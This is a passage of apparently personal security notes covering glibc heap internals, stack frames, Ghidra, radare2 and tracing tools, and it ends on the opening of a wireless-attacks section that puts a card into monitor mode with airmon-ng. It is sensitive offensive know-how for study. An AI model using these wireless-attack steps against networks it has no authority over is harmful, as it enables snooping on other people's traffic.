<pre><code>mov rax, [rdx]
</code></pre>
<p>Will check the value inside <code>rdx</code> and treat it as an address - it will go to the location where this address points and get its data from there. It will then move this data into <code>rax</code>. If we hadn't used <code>[]</code>, it would have treated the address in <code>rdx</code> simply as a value and moved it directly into <code>rax</code>.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="the-heap"><a class="header" href="#the-heap">The Heap</a></h1>
<p>The heap is a memory region which allows for dynamic allocation. Memory on the heap is allotted at runtime and programs are permitted to freely request additional heap memory whenever it is required.</p>
<p>It is the program's job to request and relieve any heap memory <em>only once</em>. Failure to do so can result in undefined behaviour. In C, heap memory is usually allocated through the use of <code>malloc</code> and whenever the program is finished with this data, the <code>free</code> function must be invoked in order to mark the area as available for use by the operating system and/or other programs.</p>
<p>Heap memory can also be allocated by using malloc-compatible heap functions like <code>calloc</code>, <code>realloc</code> and <code>memalign</code> or in C++ using the corresponding <code>new</code> and <code>new[]</code> operators as well as their deallocation counterparts <code>delete</code> and <code>delete[]</code>.</p>
<h2 id="heap-rules"><a class="header" href="#heap-rules">Heap Rules</a></h2>
<ol>
<li><em>Do not</em> read or write to a pointer returned by <code>malloc</code> after that pointer has been passed to <code>free</code>. -&gt; Can lead to use after free vulnerabilities. </li>
<li><em>Do not</em> use or leak uninitialised information in a heap allocation. -&gt; Can lead to information leaks or uninitialised data vulnerabilities.</li>
<li><em>Do not</em> read or write bytes after the end of an allocation. -&gt; Can lead to heap overflow and read beyond bounds vulnerabilities.</li>
<li><em>Do not</em> pass a pointer that originated from <code>malloc</code> to <code>free</code> more than once. -&gt; Can lead to double delete vulnerabilities.</li>
<li><em>Do not</em> write bytes before the beginning of the allocation. -&gt; Can lead to heap underflow vulnerabilities.</li>
<li><em>Do not</em> pass a pointer that did not originate from <code>malloc</code> to <code>free</code>.  -&gt; Can lead to invalid free vulnerabilities.</li>
<li><em>Do not</em> use a pointer returned by <code>malloc</code> before checking if the function returned <code>NULL</code>. -&gt; Can lead to null-dereference bugs and sometimes arbitrary write vulnerabilities.</li>
</ol>
<p>The implementation of the heap is platform specific.</p>
<h1 id="the-glibc-heap"><a class="header" href="#the-glibc-heap">The GLIBC Heap</a></h1>
<p>The heap grows from lower to higher addresses. </p>
<h2 id="chunks"><a class="header" href="#chunks">Chunks</a></h2>
<p>The heap manager allocates resources in the so-called <em>chunks</em>. These chunks are stored adjacent to each other and must be 8-byte aligned or 16-byte aligned on 32-bit and 64-bit systems respectively. In addition to this padding, each chunks contains metadata which provides information about the chunk itself. Consequently, issuing a request for memory allocation on the heap actually allocates more bytes than originally requested.</p>
<p>It is important to distinguish between in-use chunks and free (or previously allocated) chunks, since they have disparate memory layouts.</p>
<p>The following diagram outlines a chunk that is in use:</p>
<p><img src="Reverse%20Engineering/Program%20Anatomy/Resources/Images/In_use_chunk.png" alt="" /></p>
<p>The <code>size</code> field contains the chunk size in bytes. The following three bits carry specific meaning:</p>
<ul>
<li><strong>A (0x04)</strong> - Allocated arena. If this bit is 0, the chunk comes from the main arena and the main heap. If this bit is 1, the chunk comes from mmap'd memory and the location of the heap can be computed from the chunk's address.</li>
<li><strong>M (0x02)</strong> - If this bit is set, then the chunk was <code>mmap</code>-ed and isn't part of a heap. Typically used for large allocations.</li>
<li><strong>P (0x01)</strong> - If this bit is set, then the previous chunk should not be considered for coalescing and the <code>mchunkptr</code> points to a previous chunk still in use</li>
</ul>
<p>A free chunk looks a bit different:</p>
<p><img src="Reverse%20Engineering/Program%20Anatomy/Resources/Images/Free_chunk.png" alt="" /></p>
<p>The size and AMP fields carry on the same meaning as those in chunks that are in use. Free chunks are organised in linked or doubly linked lists called <em>bins</em>. The <code>fwd</code> and <code>bck</code> pointers are utilised in the implementation of those linked lists. Different types of bins exist for different purposes.</p>
<p>The top of the heap is by convention called <em>the top chunk</em>.</p>
<h2 id="memory-allocation-on-the-heap"><a class="header" href="#memory-allocation-on-the-heap">Memory Allocation on the Heap</a></h2>
<h3 id="allocating-from-free-chunks"><a class="header" href="#allocating-from-free-chunks">Allocating from Free Chunks</a></h3>
<p>When an application requests heap memory, the heap manager traverses the bins in search of a free chunk that is large enough to service the request. If such a chunk is found, it is removed from the bin, turned into an in-use chunk and then a pointer is returned to the user data section of the chunk.</p>
<h3 id="allocating-from-the-top-chunk"><a class="header" href="#allocating-from-the-top-chunk">Allocating from the Top Chunk</a></h3>
<p>If no free chunk is found that can service the request, the heap manager must construct an entirely new chunk at the top of heap. To achieve this, it first needs to ascertain whether there is enough space at the top of the heap to hold the new chunk.</p>
<h3 id="requesting-additional-memory-at-the-top-of-the-heap-from-the-kernel"><a class="header" href="#requesting-additional-memory-at-the-top-of-the-heap-from-the-kernel">Requesting Additional Memory at the Top of the Heap from the Kernel</a></h3>
<p>Once the free space at the top of the heap is used up, the heap manager will have to ask the kernel for additional memory.</p>
<p>On the initial heap, the heap manager asks the kernel to allocate more memory at the end of the heap by calling <code>sbrk</code>.On most Linux-based systems this function internally uses a system call called <code>brk</code>. </p>
<p>Eventuall, the heap will grow to its maximum size, since expanding it any further would cause it to intrude on other sections of the process' address space. In this case, the heap manager will resort to using <code>mmap</code> to map new memory for heap expansions.</p>
<p>If <code>mmap</code> also fails, then the process is unable to allocate more memory and <code>malloc</code> returns <code>NULL</code>.</p>
<h3 id="allocating-large-chunks"><a class="header" href="#allocating-large-chunks">Allocating Large Chunks</a></h3>
<p>Large chunks get treated differently in their allocation. These are allocated off-heap through the direct use of <code>mmap</code> calls and this is reflected in the chunk's metadata by setting the <code>M</code> bit to 1. When such allocations are later returned to the heap manager via a call to <code>free</code>, the heap manager releases the entire <code>mmap</code>-ed region back to the system via <code>munmap</code>.</p>
<p>Different platforms have different default thresholds for what counts as a large chunk and what doesn't.</p>
<h2 id="arenas"><a class="header" href="#arenas">Arenas</a></h2>
<p>Multithreaded applications require that internal data structures on the heap are protected from race conditions. In the past, the heap manager availed itself of a global mutex before every heap operation, however, significant performance issues arose as a result. Consequently, the concept of &quot;arenas&quot; was introduced. </p>
<p>Each arena consists of a separate heap which manages its own chunk allocation and bins. Although each arena still utilises a mutex for its internal operations, different threads can make use of different arenas to avoid having to wait for each other. </p>
<p>The initial (main) arena consists of a single heap and for single-threaded applications it is all there ever will exist. However, as more threads are spawned, new arenas are allocated and attached to them. Once all available arenas are being utilised by threads, the heap manager will commence creating new ones until a limit - <code>2 * Number of CPU cores</code> for 32-bit and <code>8 * Number of CPU cores</code> for 64-bit processes - is reached. Afterwards, multiple threads will be forced to share the same arena.</p>
<h2 id="bins"><a class="header" href="#bins">Bins</a></h2>
<p>Free chunks are organised in the so-called <em>bins</em> which are essentially linked lists. For performance reasons different types of bins exist. There are 62 <strong>small bins,</strong> 63 <strong>large bins,</strong> 1 <strong>unsorted bin,</strong> 10 <strong>fast bins</strong> and 64 <strong>tcache bins</strong> per thread. The last two appeared later and are built on top of the first three.</p>
<p>Pointers to the small, large, and unsorted bins are stored in the same array in the heap manager:</p>
<pre><code class="language-cpp">BIN[0] -&gt; invalid (unused)
BIN[1] -&gt; unsorted bin
BIN[2] to BIN[63] -&gt; small bins
BIN[64] to BIN[126] -&gt; large bins
</code></pre>
<h3 id="small-bins"><a class="header" href="#small-bins">Small Bins</a></h3>
<p>There are 62 small bins and each of them stores chunks of a fixed size. Each chunk with a size less than 512 bytes on 32-bit systems and 1024 bytes on 64-bit systems has a corresponding small bin. Small bins are sorted by default due to the fixed size of their elements and Insertion and removal of entries on these bins is incredibly fast.</p>
<p><img src="Reverse%20Engineering/Program%20Anatomy/Resources/Images/Small%20Bin.png" alt="" /></p>
<h3 id="large-bins"><a class="header" href="#large-bins">Large Bins</a></h3>
<p>There are 63 large bins and they resemble small bins in their operation but store chunks of different sizes. Consequently, insertions and removal of entries on these lists is slower, since the entire bin has to be traversed in order to find a suitable chunk. </p>
<p>There is a different number of bins allocated for specific chunk size ranges. The size of the chunk size range begins at 64 bytes - there are 32 bins all of which shift the range of chunk sizes they store by 64 from the previous bin. Following are 16 bins which shift the range by 512 bytes and so on.</p>
<p>In essence:</p>
<ul>
<li>Bin 1 -&gt; stores chunks of sizes 512 - 568 bytes;</li>
<li>Bin 2 -&gt; stores chunks of sizes 576 - 632 bytes;</li>
<li>...</li>
</ul>
<p>There are:</p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">Number of Bins</th><th style="text-align: center">Spacing between Bins</th></tr></thead><tbody>
<tr><td style="text-align: center">32</td><td style="text-align: center">64</td></tr>
<tr><td style="text-align: center">16</td><td style="text-align: center">512</td></tr>
<tr><td style="text-align: center">8</td><td style="text-align: center">4096</td></tr>
<tr><td style="text-align: center">4</td><td style="text-align: center">32768</td></tr>
<tr><td style="text-align: center">2</td><td style="text-align: center">262144</td></tr>
<tr><td style="text-align: center">1</td><td style="text-align: center">Remaining chunk sizes</td></tr>
</tbody></table>
</div>
<h3 id="unsorted-bins"><a class="header" href="#unsorted-bins">Unsorted Bins</a></h3>
<p>There is a single unsorted bin. Chunks from small and large bins end up directly in this bin after they are freed. The point of the unsorted bin is to speed up allocations by serving a sort of cache. When <code>malloc</code> is invoked, it will first traverse this bin and see if it can immediately service the request. If not, it will move onto the small or large bins respectively.</p>
<h3 id="fast-bins"><a class="header" href="#fast-bins">Fast Bins</a></h3>
<p>Fast bins provide a further optimisation layer. Recently released small chunks are put in fast bins and are not initially merged with their neighbours. This allows for them to be repurposed forthwith, should a <code>malloc</code> request for that chunk size come very soon after the chunk's release. There are 10 fast bins, covering chunks of size 16, 24, 32, 40, 48, 56, 64, 72, 80, and 88 bytes plus chunk metadata.</p>
<p>Fast bins are implemented as singly linked lists and insertions and removals of entries in them are really fast. Periodically, the heap manager <em>consolidates</em> the heap - chunks in the fast bins are merged with the abutting chunks and inserted into the unsorted bin.</p>
<p>This consolidation occurs when a <code>malloc</code> request is issued for a size that is larger than a fast bin can serve (chunks over 512 bytes on 32-bit systems and over 1024 bytes on 64-bit systems), when freeing a chunk larger than 64KB or when <code>malloc_trim</code> or <code>mallopt</code> is invoked.</p>
<h3 id="tcache-bins"><a class="header" href="#tcache-bins">TCache Bins</a></h3>
<p>A new caching mechanism called <em>tcache</em> (thread local caching) was introduced in glibc version 2.26 back in 2017. </p>
<p>The tcache stores bins of fixed size small chunks as singly linked lists. Similarly to a fast bin, chunks in tcache bins aren't merged with adjoining chunks. By default, there are 64 tcache bins, each containing a maximum of 7 same-sized chunks. The possible chunk sizes range from 12 to 516 bytes on 32-bit systems and from 24 to 1032 bytes on 64-bit systems.</p>
<p>When a chunk is freed, the heap manager checks if the chunk fits into a tcache bin corresponding to that chunk size. If the tcache bin for this size is full or the chunk is simply too big to fit into a tcache bin, the heap manager obtains a lock on the arena and proceeds to comb through other bins in order to find a suitable one for the chunk.</p>
<p>When <code>malloc</code> needs to service a request, it first checks the tcache for a chunk of the requested size that is available and should such a chunk be found, <code>malloc</code> will return it without ever having to obtain a lock. If the chunk too big, <code>malloc</code> continues as before.</p>
<p>A slightly different strategy is employed if the requested chunk size does have a corresponding tcache bin, but that bin is simply full. In that case, <code>malloc</code> obtains a lock and promotes as many heap chunks of the requested size to tcache chunks, up to the tcache bin limit of 7. Subsequently, the last matching chunk is returned.</p>
<h2 id="malloc-and-free"><a class="header" href="#malloc-and-free"><code>malloc</code> and <code>free</code></a></h2>
<h3 id="allocation"><a class="header" href="#allocation">Allocation</a></h3>
<p>First, every allocation exists as a memory chunk which is aligned and contains metadata as well as the region the programmer wants. When a programmer requests memory from the heap, the heap manager first works out what chunk size the allocation request corresponds to, and then searches for the memory in the following order:</p>
<ol>
<li>If the size corresponds with a <em>tcache</em> bin and there is a <code>tcache</code> chunk available, return that immediately.</li>
<li>If the request is huge, allocate a chunk off-heap via <code>mmap.</code></li>
<li>Otherwise obtain the arena heap lock and then perform the following steps, in order:
<ol>
<li><strong>Try the <em>fastbin/smallbin</em> recycling strategy</strong>
<ul>
<li>If a corresponding fast bin exists, try and find a chunk from there (and also opportunistically prefill the tcache with entries from the fast bin).</li>
<li>Otherwise, if a corresponding small bin exists, allocate from there (opportunistically prefilling the tcache as we go).</li>
</ul>
</li>
<li><strong>Resolve all the deferred frees</strong>
-   Otherwise merge the entries in the fast bins and move their consolidated chunks to the unsorted bin.
-   Go through each entry in the unsorted bin. If it is suitable, return it. Otherwise, put the unsorted entry on its corresponding small/large bin as we go (possibly promoting small entries to the tcache).</li>
<li><strong>Default back to the basic recycling strategy</strong>
<ul>
<li>If the chunk size corresponds with a large bin, search the corresponding large bin now.</li>
</ul>
</li>
<li><strong>Create a new chunk from scratch</strong>
<ul>
<li>Otherwise, there are no chunks available, so try and get a chunk from the top of the heap.</li>
<li>If the top of the heap is not big enough, extend it using <code>sbrk</code>.</li>
<li>If the top of the heap can’t be extended because we ran into something else in the address space, create a discontinuous extension using <code>mmap</code> and allocate from there</li>
</ul>
</li>
<li><strong>If all else fails, return <code>NULL</code>.</strong></li>
</ol>
</li>
</ol>
<h3 id="deallocation"><a class="header" href="#deallocation">Deallocation</a></h3>
<ol>
<li>If the pointer is <code>NULL</code>, do nothing.</li>
<li>Otherwise, convert the pointer back to a chunk by subtracting the size of the chunk metadata.</li>
<li>Perform a few sanity checks on the chunk, and abort if the sanity checks fail.</li>
<li>If the chunk fits into a tcache bin, store it there.</li>
<li>If the chunk has the <code>M</code> bit set, give it back to the operating system via <code>munmap</code>.</li>
<li>Otherwise we obtain the arena heap lock and then:
<ol>
<li>If the chunk fits into a fastbin, put it on the corresponding fastbin.</li>
<li>If the chunk size is greater than 64KB, consolidate the fastbins immediately and put the resulting merged chunks on the unsorted bin.</li>
<li>Merge the chunk backwards and forwards with neighboring freed chunks in the small, large, and unsorted bins.</li>
<li>If the resulting chunk lies at the top of the heap, merge it into the top chunk.</li>
<li>Otherwise store it in the <code>unsorted bin</code>. </li>
</ol>
</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="the-stack"><a class="header" href="#the-stack">The Stack</a></h1>
<p>The stack is a place in memory. It's a Last-In-First-Out (LIFO) data structure, meaning that the last element to be added will be the first to get removed. Each process has access to its own stack which isn't bigger than a few megabytes. Adding data to the stack is called <em>pushing</em> onto the stack, whilst removing data is called <em>popping</em> off the stack. Although the location of the added or removed data is fixed (it's always to or from the top of the stack), existing data can still be read or written to arbitrarily.</p>
<p>A special register is used for keeping track of the <em>top</em> of the stack - the stack pointer or <code>rsp</code>. When pushing data, the stack pointer <em>diminishes</em>, and when removing data, the stack pointer <em>augments</em>. This is because the stack grows from higher to lower memory addresses.</p>
<p><img src="Reverse%20Engineering/Program%20Anatomy/Resources/Images/TheStack.png" alt="" /></p>
<h1 id="stack-frames"><a class="header" href="#stack-frames">Stack Frames</a></h1>
<p>When a function is invoked, a <em>stack frame</em> is constructed. First, the function's arguments which do not fit into the registers are pushed on the stack, then the <em>return</em> address is also pushed. Following this, the value of a special register known as the <em>base pointer</em> (<code>rbp</code>) is saved onto the stack and the value inside the register is then updated to point to the location on the stack where we saved the base pointer.</p>
<p>From then on, the stack pointer is used for allocating local data inside the function and the base pointer is used for accessing this data.</p>
<pre><code class="language-cpp">long func(long a, long b, long c, long d,
            long e, long f, long g, long h)
{
    long x = a * b * c * d * e * f * g * h;
    long y = a + b + c + d + e + f + g + h;
    long z = otherFunc(x, y);
    return z + 20;
}
</code></pre>
<p><img src="Reverse%20Engineering/Program%20Anatomy/Resources/Images/stackframe.png" alt="" /></p>
<p>Sometimes, the base pointer might be completely absent in optimised programs because compilers are good enough in keeping track of offsets directly from the stack pointer.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-35"><a class="header" href="#introduction-35">Introduction</a></h1>
<p>Ghidra is an open-source framework for reverse engineering developed by the NSA. It groups binaries into <em>projects</em> which can be shared amonst multiple people.</p>
<h1 id="installation"><a class="header" href="#installation">Installation</a></h1>
<p>To install Ghidra, you can run <code>sudo apt install ghidra</code>.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="creating-a-project"><a class="header" href="#creating-a-project">Creating a Project</a></h1>
<ul>
<li>File -&gt; New Project
<ul>
<li>Non-Shared Project</li>
<li>Select Directory</li>
<li>Name the Project</li>
</ul>
</li>
</ul>
<p><img src="Reverse%20Engineering/Reverse%20Engineering%20with%20Ghidra/Resources/Images/create-project.png" alt="" /></p>
<h1 id="loading-a-binary"><a class="header" href="#loading-a-binary">Loading a Binary</a></h1>
<ul>
<li>
<p>File -&gt; Import File</p>
<p><img src="Reverse%20Engineering/Reverse%20Engineering%20with%20Ghidra/Resources/Images/import-file.png" alt="" /></p>
<ul>
<li>
<p>Select the binary you want to import</p>
</li>
<li>
<p>Ghidra will automatically detect certain information about the file</p>
<p><img src="Reverse%20Engineering/Reverse%20Engineering%20with%20Ghidra/Resources/Images/file-info-import.png" alt="" /></p>
</li>
<li>
<p>After importing, Ghidra will display an Import Results Summary containing information about the binary</p>
<p><img src="Reverse%20Engineering/Reverse%20Engineering%20with%20Ghidra/Resources/Images/Pasted%20image%2020211112104550.png" alt="" /></p>
</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="initial-analysis"><a class="header" href="#initial-analysis">Initial Analysis</a></h1>
<p>Double-clicking on a program will open it in the Code Browser. A prompt will appear for analysing the binary. Ghidra will attempt to create and label functions, as well as identify any cross-references in memory. Once the binary has been analysed you will be presented with the following screen:</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-36"><a class="header" href="#introduction-36">Introduction</a></h1>
<p><code>radare2</code> is an open-source framework for reverse engineering. The framework includes multiple tools which all work in tandem in order to aid in the analysis of binary files. </p>
<p>It uses short abbreviations for its commands - single letters - and many of its commands have subcommands which are also expressed as single letters. Luckily, you can always append a <code>?</code> to a specific command in order to view its subcommands and what they do.</p>
<p>To quit <code>radare2</code>, use the <code>q</code> command.</p>
<h1 id="loading-a-binary-1"><a class="header" href="#loading-a-binary-1">Loading a Binary</a></h1>
<p>You can load a binary by invoking the <code>r2</code> command. You might sometimes need to also add the <code>-e io.cache=true</code> option in order to fix relocations in disassembly.</p>
<p><img src="Reverse%20Engineering/Reverse%20Engineering%20with%20radare2/Resources/Images/load-binary.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="analysis"><a class="header" href="#analysis">Analysis</a></h1>
<ul>
<li><code>aaa</code> - analyse the binary
<img src="Reverse%20Engineering/Reverse%20Engineering%20with%20radare2/Resources/Images/aaa.png" alt="" />
<ul>
<li><code>afl</code> - list the analysed functions
<img src="Reverse%20Engineering/Reverse%20Engineering%20with%20radare2/Resources/Images/afl.png" alt="" /></li>
<li><code>axt &lt;function&gt;</code> - list all the places where a function is called. Note, you need to use the flag name that redare automatically creates for funtions after <code>aaa</code>.
<img src="Reverse%20Engineering/Reverse%20Engineering%20with%20radare2/Resources/Images/axt.png" alt="" /></li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="binary-info"><a class="header" href="#binary-info">Binary Info</a></h1>
<ul>
<li>
<p><code>i</code> - display file information</p>
<p><img src="Reverse%20Engineering/Reverse%20Engineering%20with%20radare2/Resources/Images/file-metadata.png" alt="" /></p>
<ul>
<li>
<p><code>ie</code> - find the program's entry point</p>
<p><img src="Reverse%20Engineering/Reverse%20Engineering%20with%20radare2/Resources/Images/entry-point.png" alt="" /></p>
</li>
<li>
<p><code>iM</code> - find the program's main function</p>
<p><img src="Reverse%20Engineering/Reverse%20Engineering%20with%20radare2/Resources/Images/main-function.png" alt="" /></p>
</li>
<li>
<p><code>iz</code> - pull the hard-coded strings from the executable (only the data sections), use <code>izz</code> to get the strings from the entire binary</p>
<p><img src="Reverse%20Engineering/Reverse%20Engineering%20with%20radare2/Resources/Images/pull-strings.png" alt="" /></p>
</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="flags"><a class="header" href="#flags">Flags</a></h1>
<p>Flags resemble bookmarks. They associate a name with a given offset in a file.</p>
<p>Create a new flag</p>
<pre><code>f &lt;name&gt; @ offset
</code></pre>
<p>You can also remove a flag by appending <code>-</code> to the command:</p>
<pre><code>f-&lt;name&gt;
</code></pre>
<p>List available flags - <code>f</code>:</p>
<p><img src="Reverse%20Engineering/Reverse%20Engineering%20with%20radare2/Resources/Images/list-flags.png" alt="" /></p>
<p>Rename a flag</p>
<pre><code>fr &lt;old name&gt; &lt;new name&gt;
</code></pre>
<h2 id="local-flags"><a class="header" href="#local-flags">Local Flags</a></h2>
<p>Flag names should be unique for addressing reasons. However, it is often the case that you need to have simple and ubiquitous names like <code>loop</code> or <code>return</code>. For this purpose exist the so-called &quot;local&quot; flags, which are tied to the function where they reside. It is possible to add them using <code>f.</code> command:</p>
<h1 id="flag-spaces"><a class="header" href="#flag-spaces">Flag Spaces</a></h1>
<p>Flags can be grouped into flag spaces - is a namespace for flags, grouping together similar flags. Some flag spaces include sections, registers, symbols. These are managed with the <code>fs</code> command.</p>
<pre><code class="language-bash">[0x00001080]&gt; fs?
Usage: fs [*] [+-][flagspace|addr]   # Manage flagspaces
| fs            display flagspaces
| fs*           display flagspaces as r2 commands
| fsj           display flagspaces in JSON
| fs *          select all flagspaces
| fs flagspace  select flagspace or create if it doesn't exist
| fs-flagspace  remove flagspace
| fs-*          remove all flagspaces
| fs+foo        push previous flagspace and set
| fs-           pop to the previous flagspace
| fs-.          remove the current flagspace
| fsq           list flagspaces in quiet mode
| fsm [addr]    move flags at given address to the current flagspace
| fss           display flagspaces stack
| fss*          display flagspaces stack in r2 commands
| fssj          display flagspaces stack in JSON
| fsr newname   rename selected flagspace
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="seeking"><a class="header" href="#seeking">Seeking</a></h1>
<p>Moving around the file requires the usage of the seek (<code>s</code>) command in order to change the offset at which we are. It takes one argument which is a mathematical expression capable of containing flag names, parenthesis, addition, substraction, multiplication of immediates of contents of memory using brackets. Examples:</p>
<pre><code>[0x00000000]&gt; s 0x10
[0x00000010]&gt; s+4
[0x00000014]&gt; s-
[0x00000010]&gt; s+
[0x00000014]&gt;
</code></pre>
<p>Here is a list of additional seeking commands:</p>
<pre><code>[0x00000000]&gt; s?
Usage: s    # Help for the seek commands. See ?\\( ? to see all variables
| s                 Print current address
| s.hexoff          Seek honoring a base from core-&gt;offset
| s:pad             Print current address with N padded zeros (defaults to 8)
| s addr            Seek to address
| s-                Undo seek
| s-*               Reset undo seek history
| s- n              Seek n bytes backward
| s--[n]            Seek blocksize bytes backward (/=n)
| s+                Redo seek
| s+ n              Seek n bytes forward
| s++[n]            Seek blocksize bytes forward (/=n)
| s[j*=!]           List undo seek history (JSON, =list, *r2, !=names, s==)
| s/ DATA           Search for next occurrence of 'DATA'
| s/x 9091          Search for next occurrence of \x90\x91
| sa [[+-]a] [asz]  Seek asz (or bsize) aligned to addr
| sb                Seek aligned to bb start
| sC[?] string      Seek to comment matching given string
| sf                Seek to next function (f-&gt;addr+f-&gt;size)
| sf function       Seek to address of specified function
| sf.               Seek to the beginning of current function
| sg/sG             Seek begin (sg) or end (sG) of section or file
| sl[?] [+-]line    Seek to line
| sn/sp ([nkey])    Seek to next/prev location, as specified by scr.nkey
| so [N]            Seek to N next opcode(s)
| sr pc             Seek to register
| ss                Seek silently (without adding an entry to the seek history)

&gt; 3s++        ; 3 times block-seeking
&gt; s 10+0x80   ; seek at 0x80+10

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="strings"><a class="header" href="#strings">Strings</a></h1>
<ul>
<li><code>/ &lt;string&gt;</code> - search the bytes of the binary for a specific string
<img src="Reverse%20Engineering/Reverse%20Engineering%20with%20radare2/Resources/Images/search-bytes-basic.png" alt="" />
<ul>
<li><code>/w &lt;string&gt;</code> - search for wide character strings like Unicode symbols</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-37"><a class="header" href="#introduction-37">Introduction</a></h1>
<p>Source code gets compiled to assembly and then assembly gets compiled to machine code. Assembly has a direct one-to-one mapping of its instructions to those in machine language. This makes assembly the only possible way to disambiguously take a look at what a program does. Assembly is essentially a human readable version of machine code.</p>
<h2 id="intel-vs-att-syntax"><a class="header" href="#intel-vs-att-syntax">Intel vs AT&amp;T Syntax</a></h2>
<p>There are two general syntax formats for writing Assembly - Intel and AT&amp;T. I will be using Intel throughout my notes, but here is a list of common differences between the two because you never know which one you might have to read:</p>
<h3 id="intel"><a class="header" href="#intel">Intel</a></h3>
<ul>
<li>Instruction format - <code>operation destination, source</code></li>
<li>Instruction sufixes - none</li>
<li>Register &amp; Immediate value prefixes - none</li>
<li>Dereferencing - done with <code>[]</code></li>
</ul>
<h3 id="att"><a class="header" href="#att">AT&amp;T</a></h3>
<ul>
<li>Instruction format - <code>operation source, destination</code></li>
<li>Mnemonic sufixes - mnemonics have a suffix depending on the size of their operands - <code>b</code> for byte, <code>w</code> for word, <code>l</code> long
<pre><code>movb %bl,%al
movw %bx,%ax
movl  %ebx,%eax
movl (%ebx),%eax
</code></pre>
</li>
<li>Register &amp; Immediate value prefixes - registers are prefixed with <code>%</code> and immediate values with <code>\\( </code></li>
<li>Dereferencing - done with <code>()</code></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="reverse-engineering-with-objdump"><a class="header" href="#reverse-engineering-with-objdump">Reverse Engineering with objdump</a></h1>
<p><code>objdump</code> is a program for displaying information from binaries. It can be used for showing different aspects of the object file. By default, it generates AT&amp;T assembly, but you can change this with the <code>-M intel</code> option.</p>
<ul>
<li>
<p>disassemble everything - <code>-D</code></p>
<pre><code>objdump -D &lt;binary&gt; -M intel
</code></pre>
<p><img src="Reverse%20Engineering/Resources/Images/objdump-basic.png" alt="" /></p>
</li>
<li>
<p>display sections headers - <code>-h</code></p>
<pre><code>objdump -h &lt;binary&gt;
</code></pre>
<p><img src="Reverse%20Engineering/Resources/Images/objdump-section-headers.png" alt="" /></p>
</li>
<li>
<p>print private headers - <code>-p</code></p>
<pre><code>objdump -p &lt;binary&gt;
</code></pre>
<p>Note the flags on the private headers. If the <code>x</code> flag is on, then that section is executable.</p>
<p><img src="Reverse%20Engineering/Resources/Images/objdump-private-headers.png" alt="" /></p>
</li>
</ul>
<h1 id="tracing-syscalls-with-strace"><a class="header" href="#tracing-syscalls-with-strace">Tracing syscalls with strace</a></h1>
<p><code>strace</code> is a program for tracing what system calls a binary issues during runtime. It can be used with the following basic syntax:</p>
<pre><code>strace &lt;binary&gt;
</code></pre>
<p>Note, that if the binary is in your current working directory, you will need to prepend <code>./</code> to its name because <code>strace</code> works with processes and not the actual stored binary.</p>
<p><img src="Reverse%20Engineering/Resources/Images/strace-basic.png" alt="" /></p>
<h1 id="tracing-library-calls-with-ltrace"><a class="header" href="#tracing-library-calls-with-ltrace">Tracing library calls with ltrace</a></h1>
<p><code>ltrace</code> is rather similar to <code>strace</code>, but instead of system calls, it traces calls to functions in certain libraries. The syntax for it isn't unlike that for <code>strace</code>.</p>
<pre><code>ltrace &lt;binary&gt;
</code></pre>
<p>Note, that if the binary is in your current working directory, you will need to prepend <code>./</code> to its name because <code>ltrace</code> works with processes and not the actual stored binary.</p>
<p><img src="Reverse%20Engineering/Resources/Images/ltrace-basic.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-38"><a class="header" href="#introduction-38">Introduction</a></h1>
<p>WiFi has become an integral part of our lives.</p>
<p>Many wireless attack will require a wireless adapter which supports <a href="https://deviwiki.com/wiki/List_of_Wireless_Adapters_That_Support_Monitor_Mode_and_Packet_Injection">monitor mode and packet injection</a>.</p>
<h1 id="monitor-mode"><a class="header" href="#monitor-mode">Monitor Mode</a></h1>
<p>Monitor mode disconnects a wireless interface from any network that it may be connected to and allows the device to listen to <em>all</em> traffic in the area at the same, from <em>all</em> access points and <em>all</em> clients. </p>
<p>Since certain processes may interfere with the wireless device, they should be checked for before putting the wireless card into monitor mode. This can be done via the following command:</p>
<pre><code>sudo airmon-ng check
</code></pre>
<p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WIFI_airmon_check.png" alt="" /></p>
<p><code>airmon-ng</code> is also capable of stopping these processes if <code>kill</code> is added to the above command:</p>
<pre><code>sudo airmon-ng check kill
</code></pre>
<p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WIFI_airmon_check_kill.png" alt="" /></p>
<p>A list of the available network devices may be obtained through <code>iwconfig</code>:</p>
<p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WIFI_iwconfig_list.png" alt="" /></p>
<p>In order to put a wireless card into monitor mode, the following command may be used:</p>
<pre><code>sudo airmon-ng start &lt;dev&gt;
</code></pre>
<p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WIFI_airmon_start.png" alt="" /></p>
<p>Alternatively, the following sequence of commands may be used:</p>
<pre><code>sudo ifconfig &lt;dev&gt; down
sudo iwconfig &lt;dev&gt; mode monitor
sudo ifconfig &lt;dev&gt; up
</code></pre>
<p>When putting a wireless device into monitor mode, its name may be altered, for example by appending <code>mon</code>. It is useful to again list the network devices connected to the system to check if any names have been changed.</p>
<p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WIFI_iwconfig_list_monitor_mode.png" alt="" /></p>
<p>Once you are done, you should disable monitor mode:</p>
<pre><code>sudo airmon-ng stop wlan0
</code></pre>
<p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WIFI_airmon_stop.png" alt="" /></p>
<p>Alternatively, <code>ifconfig</code> and <code>iwconfig</code> may be also be used to disable monitor mode:</p>
<pre><code>sudo ifconfig &lt;dev&gt; down
sudo iwconfig &lt;dev&gt; mode managed
sudo ifconfig &lt;dev&gt; up
</code></pre>
